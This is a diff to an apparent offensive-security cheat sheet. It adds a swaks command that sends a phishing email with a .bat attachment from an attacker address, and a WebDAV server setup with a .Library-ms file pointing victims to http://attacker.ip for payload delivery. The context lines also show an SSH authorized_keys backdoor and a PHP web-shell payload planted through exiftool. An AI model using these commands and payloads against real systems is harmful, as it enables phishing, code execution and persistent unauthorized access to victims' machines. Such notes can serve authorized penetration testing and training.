@@ -30,6 +30,7 @@
 * [SSH - 22](#ssh---22)
   * [Login Brute force](#login-brute-force)
   * [SSH backdoor - post exploitation](#ssh-backdoor---post-exploitation)
+* [SMTP - 25](#smtp---25)
 * [HTTP, HTTPS - 80, 443](#http-https---80-443)
 * [SNMP - 161](#snmp---161)
 * [SMB - 445](#smb---445)
@@ -55,6 +56,7 @@
 * [ReverseShell](#ReverseShell)
 * [Searchsploit](#Searchsploit)
 * [Exiftool](#Exiftool)
+* [Microsoft Windows Library Files](#Microsoft-Windows-Library-Files)
 
 # Tools
 
@@ -121,6 +123,15 @@ echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys
 
 # Connect
 ssh -i <FILENAME> <USER>@<IP>
+~~~
+
+
+# SMTP - 25
+
+## Send Email
+
+~~~ bash
+swaks --to target@example.com --from attacker@example.com --server example.com --auth LOGIN --auth-user attacker@example.com --auth-password password123 --header 'Subject: Test email' --body "This email contains an attachment." --attach @filename.bat
 ~~~
 
 
@@ -704,7 +715,37 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.png
 reference: https://www.hahwul.com/blog/2017/web-hacking-metadata-payload/
 
 
+# Microsoft Windows Library Files
 
+## Installation of wsgidav
 
+~~~ bash
+pip install wsgidav
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
+~~~
+
+## config.Library-ms
+
+~~~ xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://attacker.ip</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+~~~
 
 
